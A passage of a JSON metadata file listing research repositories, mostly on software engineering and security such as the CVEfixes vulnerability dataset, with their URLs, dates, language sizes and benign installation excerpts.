                    "type": "Programming_language",
                    "size": 599097
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 562659
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 365670
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 302867
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 137537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 92522
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 39069
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 21423
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Click",
                    "name": "Click",
                    "type": "Programming_language",
                    "size": 19348
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 19067
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Gnuplot",
                    "name": "Gnuplot",
                    "type": "Programming_language",
                    "size": 9919
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 8933
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Smarty",
                    "name": "Smarty",
                    "type": "Programming_language",
                    "size": 7402
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "QMake",
                    "name": "QMake",
                    "type": "Programming_language",
                    "size": 6602
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 3281
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 3021
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SWIG",
                    "name": "SWIG",
                    "type": "Programming_language",
                    "size": 543
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "190": {
        "filename": "tianzhaotju_CodeDenoise_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/tianzhaotju/CodeDenoise",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-04-27T07:04:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-23T03:57:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 508593
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 106603
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 12341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scheme",
                    "name": "Scheme",
                    "type": "Programming_language",
                    "size": 7015
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 4184
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 3969
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2742
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 1341
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 634
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "191": {
        "filename": "JiePKU_MIA-SafeCompress_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JiePKU/MIA-SafeCompress",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-06T06:07:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-13T06:13:48Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 130115
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "192": {
        "filename": "RosaliaTufano_rlgameauthors_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RosaliaTufano/rlgameauthors",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\tOnce the wrapper has been installed, move the `agent` folder in `gym-mastar/gym/`. \n",
                    "original_header": "SuperTuxKart"
                },
                "confidence": 0.9055674417052064,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RosaliaTufano/rlgameauthors/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-17T16:19:47Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-25T16:37:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 554470
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 1545
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Ruby",
                    "name": "Ruby",
                    "type": "Programming_language",
                    "size": 132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "193": {
        "filename": "akhvorov_S3M_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/akhvorov/S3M",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\ngit clone git@github.com:akhvorov/S3M.git\ncd S3M\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Usage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/akhvorov/S3M/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-02-13T21:09:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-16T12:10:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 91670
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "194": {
        "filename": "sarthak-chakraborty_ESRO_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/sarthak-chakraborty/ESRO",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-14T04:03:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-25T08:31:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3603798
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "195": {
        "filename": "joymallyac_FairSSL_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/joymallyac/FairSSL",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "*Self-Training*\n```cd Self-Training```\n \n*LabelSpreading*\n```cd LabelSpreading```\n \n*LabelPropagation*\n```cd LabelPropagation```\n \n",
                    "original_header": "For RQ1, \\&amp; RQ2"
                },
                "confidence": 0.922772052641253,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/joymallyac/FairSSL/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```cd Initial-Set-Variation```\n```python Initial_Set_Variation.py```\n \n",
                    "original_header": "For RQ3"
                },
                "confidence": 0.9882889194756411,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/joymallyac/FairSSL/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-27T18:29:29Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-02-27T18:33:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 315537
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 256452
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "196": {
        "filename": "Microsoft_msrc-dpu-learning-to-represent-edits_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/msrc-dpu-learning-to-represent-edits",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-10-29T19:09:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-02T01:16:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 54815
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 5569
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 349
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "197": {
        "filename": "microsoft_global-resource-leaks-codeql_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/microsoft/global-resource-leaks-codeql",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft \ntrademarks or logos is subject to and must follow \n[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).\nUse of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.\nAny use of third-party trademarks or logos are subject to those third-party's policies.\n \n",
                    "original_header": "Trademarks"
                },
                "confidence": 0.9988852287322683,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/microsoft/global-resource-leaks-codeql/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-03-31T13:46:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-21T19:46:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "CodeQL",
                    "name": "CodeQL",
                    "type": "Programming_language",
                    "size": 97487
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C#",
                    "name": "C#",
                    "type": "Programming_language",
                    "size": 12226
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 4698
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "198": {
        "filename": "ALFA-group_adversarial-code-generation_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ALFA-group/adversarial-code-generation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you face issues running this codebase, please [open an issue](https://github.com/ALFA-group/adversarial-code-generation/issues) on this repository, and mention as much information to reproduce your issue, including the exact command you have run, the configurations that you have used, the output you see, etc.\nSee [posts like these](https://medium.com/nyc-planning-digital/writing-a-proper-github-issue-97427d62a20f) which describe how to communicate problems effectively via Github issues. \nTo discuss any other details on the method we introduce, contact Shashank (shash@mit.edu), Sijia (liusiji5@msu.edu), or Una-May (unamay@csail.mit.edu).\n \n",
                    "original_header": "Authors"
                },
                "confidence": 0.969467689487521,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ALFA-group/adversarial-code-generation/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The instructions that follow have been adopted from [Ramakrishnan et al.'s codebase](https://github.com/jjhenkel/averloc).\nIn this repository, we have the following directories:\n \n",
                    "original_header": "Directory Structure"
                },
                "confidence": 0.9981198125691245,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ALFA-group/adversarial-code-generation/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "This directory contains dependencies in the form of git submodukes.\n \n",
                    "original_header": "`./vendor`"
                },
                "confidence": 0.9251544124736357,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ALFA-group/adversarial-code-generation/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-03-14T22:50:45Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-22T10:07:20Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 646030
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 93505
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 53650
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 42985
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 8729
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 5485
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "199": {
        "filename": "secureIT-project_CVEfixes_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/secureIT-project/CVEfixes",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# Instructions to use CVEfixes\n\n\n## Converting the CVEfixes dataset from the compressed SQL dump\n\nBecause of limitations in GitHub storage, we provide a compressed SQL\ndump of the _CVEfixes_ vulnerability dataset via Zenodo with DOI:\n[10.5281/zenodo.4476563](https://doi.org/10.5281/zenodo.4476563). The\nfollowing script can be used to convert this compressed SQL dump into\nan SQLite3 database:\n\n```console\n$ sh Code/create_CVEfixes_from_dump.sh\n```\n\nIt is also possible to do this by hand (Windows users can use\n`sqlite3.exe` instead of `sqlite3`)\n\n```console\n$ gzcat Data/CVEfixes.sql.gz | sqlite3 Data/CVEfixes.db\n```\n\n## Exploring the vulnerability data\n\nThe overall structure of the database is as shown in [ER diagram](Doc/ER_diagram.png). \nYou can use any SQLite tool to view and query the\ndatabase. [DB Browser for SQLite](https://sqlitebrowser.org/) is an\nopen source visual explorer for SQLite databases that is available for\nMac, Windows and Linux.\n\nWe provide a [Jupyter Notebook](Examples/query_CVEfixes.ipynb) with\nexample queries to extract the data at different abstraction levels,\ncode to generate statistics, as well as the code to replicate all\ntables and plots presented in the [paper](Doc/Bhandari-Naseer-Moonen_-_CVEfixes.pdf) \nbased on the _CVEfixes_ data. \n\nSome example queries to extract the part of _CVEfixes_ database are as\nfollows:\n\n- a query to extract all the method_level vulnerability data of C\n  programming language.\n\n```console\nSQL_QUERY = \"SELECT m.method_change_id, m.name, m.code, m.before_change, f.programming_language\nfrom file_change f, method_change m\nWHERE m.file_change_id=f.file_change_id\nAND f.programming_language='C';\"\n```\n\n- another example as a query to extract all the code patches of Java\n  programming language that have added/removed only a single statement\n  to fix vulnerabilities.\n\n```console\nSQL_QUERY = \"SELECT cv.cve_id, f.filename, f.num_lines_added, f.num_lines_deleted, f.code_before, f.code_after, cc.cwe_id\nFROM file_change f, commits c, fixes fx, cve cv, cwe_classification cc\nWHERE f.hash = c.hash\nAND c.hash = fx.hash\nAND fx.cve_id = cv.cve_id\nAND cv.cve_id = cc.cve_id\nAND f.num_lines_added<=1\nAND f.num_lines_deleted<=1\nAND f.programming_language='Java';;\"\n```\n\n\n\n# (Re)Collecting the CVEfixes dataset from scratch\n\n\n## Setting up the configuration file\n\nCreate a `.CVEfixes.ini` configuration file in the project root\n(where this INSTALL.md file lives) defines the following variables \nto customize paths in the `[CVEfixes]` section: \n\n* `database_path`: directory that should contain the CVEfixes \n  database file (and some temporary files during extraction). \n\n* `sample_limit`: The number of samples to be extracted, \n  sample_limit = 0 is interpreted as unlimited samples, \n  this is discussed in more detail below. \n\nThe repository contains a file `example.CVEfixes.ini`.\n\n\n## Setting up a GitHub token\n\nWe observe that more than 98% repositories of _CVEfixes_ are hosted on\nGitHub. The [GitHub API](https://docs.github.com/en/github/authenticating-to-github/creating-a-personal-access-token)\nallows us to retrieve meta information of public repositories. Without\nconfiguration of a token, this API is rate limited and only allows\ngathering the information for approximately 25 repositories. Thus, we\nrecommend the user to obtain a GitHub token and configure a [GitHub]\nsection of the `.CVEfixes.ini` configuration file which has two\nvariables `user` and `token` for your GitHub username and access token\nrespectively. Change the values of these variables to set up the token.\nIt is recommended to not disclose the token information to prevent its\nmisuse.\n\n\n## Gathering the CVEfixes dataset\n\nThe following script recreates the _CVEfixes_ database file from scratch\nup for a time-frame from 2002 up to the latest available CVE records. Be\nwarned that depending on available internet speed and processing power,\nthe process can take quite some time (with a modern laptop, around 8-10\nhours on T1, and up to 3 days on a simple home connection). Note that\nrunning this script will overwrite an existing `CVEfixes.db`  file in\n`database_path`, but that it is possible to restore the database from\nthe SQL dump on Zenodo, as mentioned above. Before running the\nextraction, see also the above remark on [setting up a GitHub\ntoken](#setting-up-a-github-token).\n\n\n```console\n$ sh Code/create_CVEfixes_from_scratch.sh\n```\n\n## Gathering only a sample of CVEfixes for demonstration purposes\n\nAs mentioned, the complete extraction of the _CVEfixes_ dataset could\ntake up to 3 days depending on the internet connection. To enable simple\ndemonstrations, the `.CVEfixes.ini` configuration file has a\n`sample_limit` variable that is used to define the number of commits for\nCVEs to collect. Setting `sample_limit = 0` is interpreted as unlimited,\ni.e. collect all available data. When the `sample_limit` is set to a\nvalue different than `0`, only that many commits are collected from CVEs\nfor the current year. We tested `sample_limit = 25`, which took\napproximately 12 minutes to gather. However, this can take much longer\nif any of the CVEs corresponds to major projects. Therefore, whenever\n`sample_limit` is set to a value different than `0`, we filter out five\nmajor projects to minimize the time to collect a sample. \n\n\n",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/secureIT-project/CVEfixes/main/INSTALL.md"
            },
            {
                "result": {
                    "value": "_CVEfixes_ is a comprehensive vulnerability dataset that is automatically\ncollected and curated from Common Vulnerabilities and Exposures\n(CVE) records in the public [U.S. National Vulnerability Database (NVD)](https://nvd.nist.gov/).\nThe goal is to support data-driven security\nresearch based on source code and source code metrics related to fixes\nfor CVEs in the NVD by providing detailed information at different\ninterlinked levels of abstraction, such as the commit-, file-, and\nmethod level, as well as the repository- and CVE level.\n\nThis repository includes the code to replicate the data collection. \nThe complete process has been documented in the paper _\"CVEfixes: \nAutomated Collection of Vulnerabilities and Their Fixes from Open-\nSource Software\"_, a copy of which you will find in the Doc folder.\n\nBecause of limitations in GitHub storage, the dataset itself is \nreleased via Zenodo with DOI:\n[10.5281/zenodo.4476563](https://doi.org/10.5281/zenodo.4476563).\n\nThe latest release, v1.0.8, covers all published CVEs up to 23 July 2024. \nAll open-source projects that were reported in CVE records in the \nNVD in this time frame and had publicly available git repositories \nwere fetched and considered for the construction of this vulnerability \ndataset. The dataset is organized as a relational database and covers \n12107 vulnerability fixing commits in 4249 open source projects for \na total of 11873 CVEs in 272 different Common Weakness Enumeration \n(CWE) types. The dataset includes the source code before and after \nchanging 51342 files and 138974 functions. The collection took 48 \nhours with 4 workers (AMD EPYC Genoa-X 9684X).\n\n  * instructions for using _CVEfixes_ are in the \n    first section of [INSTALL.md](INSTALL.md).\n  * requirements for gathering _CVEfixes_ from scratch \n    are in [REQUIREMENTS.md](REQUIREMENTS.md).\n  * instructions for gathering _CVEfixes_ from scratch \n    are in the second section of [INSTALL.md](INSTALL.md).\n\n",
                    "type": "Text_excerpt",
                    "original_header": "CVEfixes: Automated Collection of Vulnerabilities and Their Fixes from Open-Source Software"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/secureIT-project/CVEfixes/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-17T10:21:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T23:24:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 54477
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 710
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "200": {
        "filename": "monperrus_megadiff_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASSERT-KTH/megadiff",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\nIf you use Megadiff, please cite the following technical report: \n",
                    "original_header": "Megadiff, a dataset of source code changes"
                },
                "confidence": 0.9187690024396177,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/monperrus/megadiff/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-04-12T04:57:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-10T13:19:27Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "201": {
        "filename": "Alireza-Ardalani_SBSRE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Alireza-Ardalani/SBSRE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-02-23T14:02:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-29T07:22:55Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 3698585
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "202": {
        "filename": "wogscpar_SZZUnleashed_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/wogscpar/SZZUnleashed",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2018-05-09T09:47:32Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-05T13:39:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 91549
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 82377
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 499
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 421
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "203": {
        "filename": "chains-project_SBOM-2023_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/chains-project/SBOM-2023",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "> These are the latest versions as of `Fri 5 May 2023 13:02:33 CEST`. \n",
                    "original_header": "SBOM Producers"
                },
                "confidence": 0.9035534077220818,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/chains-project/SBOM-2023/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "If you are interested in reproducing our results, the script [`reproduce.sh`](reproduce.sh) is provided for your convenience. This script will do the following: \n",
                    "original_header": "Reproduction"
                },
                "confidence": 0.9774541236754596,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/chains-project/SBOM-2023/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Java version 17 or newer\n* Apache Maven \n* Docker\n* Python 3.10 or newer\n \n",
                    "original_header": "The following software is required for reproduction:"
                },
                "confidence": 0.9998960503902884,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/chains-project/SBOM-2023/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-02-28T16:57:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-31T13:23:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 173772
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 27444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 25490
                },
                "confidence": 1,
